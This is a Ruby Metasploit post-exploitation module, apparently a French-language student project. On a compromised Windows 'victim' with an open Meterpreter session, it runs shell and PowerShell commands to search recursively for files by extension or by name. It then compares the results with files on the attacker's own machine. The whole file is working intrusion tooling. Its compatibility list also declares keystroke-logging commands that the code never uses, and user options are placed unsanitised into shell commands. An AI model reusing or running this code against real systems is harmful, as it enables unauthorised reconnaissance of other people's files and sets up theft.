##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'msf/core'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Report
  include Msf::Post::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'files manager for windows',
        'Description' => %q{
          get a resource from a system windows
        },
        'License' => MSF_LICENSE,
        'Author' => [ 'Adil et Lazare' ],
        'Platform' => [ 'win', 'linux',],
        'SessionTypes' => [ 'meterpreter'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              core_migrate
              stdapi_railgun_api
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_ui_get_idle_time
              stdapi_ui_get_keys_utf8
              stdapi_ui_start_keyscan
              stdapi_ui_stop_keyscan
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('EXTENSION', [true, 'File Extension to harvest', 'txt']),
        OptPath.new('STARTING_POINT_HOST', [true, 'Starting point', '/']),
        OptString.new('STARTING_POINT_VICTIM', [true, 'Starting point', 'C:\\']),
        OptBool.new('VERBOSE', [false, 'verbose mode', false]),
        OptString.new('FILE_NAME', [false, 'search a specific file. If this option is enabled, it will just try to find this file.', ''])
      ]
    )
  end

  def find_single_file_on_victim_post() 
    print_good("recherche du fichier #{datastore['FILE_NAME']} en cours...")
    print_good(session.shell_command_token("dir #{datastore['STARTING_POINT_VICTIM']}#{datastore['FILE_NAME']} /s /b"))
    return
  end
  # on récupère les fichiers locaux sur le système à partir du répertoire donné
  def enumerate_files_with_extension_host()

    extension = datastore['EXTENSION']
    starting_point = datastore['STARTING_POINT_HOST']
    verbose = datastore['VERBOSE']

      files = []
  
      if verbose == true then puts "browsing subdirectories in local system" end

      Dir.glob("#{starting_point}/**/*").each do |file|

      if File.file?(file) && File.extname(file) == ".#{extension}"

          if verbose == true
            puts "file with "+extension+" found !"
            puts "file : "+File.basename(file)
          end

          files << file
        end
      end
      
      files = extract_filenames(files, /[^\/]+$/)

      return files
    end

def enumerate_files_with_extension_victim()
  # Utilisation de la commande PowerShell pour rechercher récursivement les fichiers avec l'extension spécifiée
  directory = datastore['STARTING_POINT_VICTIM']
  extension = datastore['EXTENSION']

  cmd = "powershell -Command \"Get-ChildItem -Path '#{directory}' -Recurse -File -Filter '*.#{extension}' | Select-Object -ExpandProperty FullName\""

  # Exécution de la commande système et récupération de la sortie
  output = session.shell_command_token(cmd)

  if output.nil? || output.empty? then
    print_error("La commande n'a pas renvoyé de sortie ou une erreur s'est produite.")
  end

  if datastore['VERBOSE'] == true then
    puts "output : "+output
  end
  # Parsing des résultats pour extraire les chemins des fichiers
  files = output.split("\n").map(&:strip)

  files = extract_filenames(files, /[^\/\\]+$/)

  return files
end

def extract_filenames(files, regex)
  filenames = []

  files.each do |file|
    filename = file.match(regex)[0]
    filenames << filename
  end

  return filenames
end

def compare_files_list(liste_files1, liste_files2)
  # Fusionner les deux tableaux et supprimer les doublons
  res = (liste_files1 + liste_files2).uniq
  
  # Sélectionner les éléments qui ne sont présents qu'une seule fois
  liste_rest = res.select { 
    |item| (liste_files1.include?(item) && !liste_files2.include?(item)) || (!liste_files1.include?(item) && liste_files2.include?(item)) 
  }
  
  return liste_rest
end

def run
    
    if datastore['FILE_NAME'] != '' then 
      find_single_file_on_victim_post()
      return
    end

    victim_files = enumerate_files_with_extension_victim()
    host_files = enumerate_files_with_extension_host()

    if datastore['VERBOSE'] == true then
      print_good("liste des fichiers de la victime : ")
      victim_files.each do |file|
          print_status(file)
      end

      print_good("liste des fichiers de l'attaquant : ")
      host_files.each do |file|
          print_status(file)
      end
    end

    if compare_files_list(victim_files, host_files).empty? == true then
      print_good("aucune différences entre la victime et l'attquant au niveau des fichiers et des répertoires ciblés")
    else
      print_error("la victime et l'attaquant ont des fichiers différents")
    end

  end
end
